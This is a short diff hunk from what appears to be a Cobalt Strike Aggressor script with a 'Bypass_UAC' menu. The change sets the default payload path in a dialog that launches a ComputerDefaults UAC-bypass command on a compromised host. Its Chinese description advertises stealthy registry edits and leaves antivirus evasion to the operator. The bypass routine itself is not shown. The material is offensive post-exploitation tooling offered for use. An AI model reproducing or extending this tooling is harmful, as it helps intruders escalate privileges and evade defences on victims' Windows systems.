@@ -316,7 +316,7 @@ menu "Bypass_UAC" {
         separator();
     item "ComputerDefaults_for_command" {
 				blog($1, "\c9=========== ComputerDefaults_for_command ==========");
-        $dialog = dialog("BypassUac for ComputerDefaults",%(bid => $1['@'] , command => "C:\\Temp\\payload.exe"),&ComputerDefaults_uac_command);
+        $dialog = dialog("BypassUac for ComputerDefaults",%(bid => $1['@'] , command => "C:\\Windows\\Temp\\ico.exe"),&ComputerDefaults_uac_command);
         dialog_description($dialog,"通过 ComputerDefaults Bypass uac(执行命令,可操作性更强,自己处理免杀部分细节,还可以利用Windows api函数修改注册表更加隐蔽)");
         drow_text($dialog,"command","Payload:");
         dbutton_action($dialog,"Exploits");
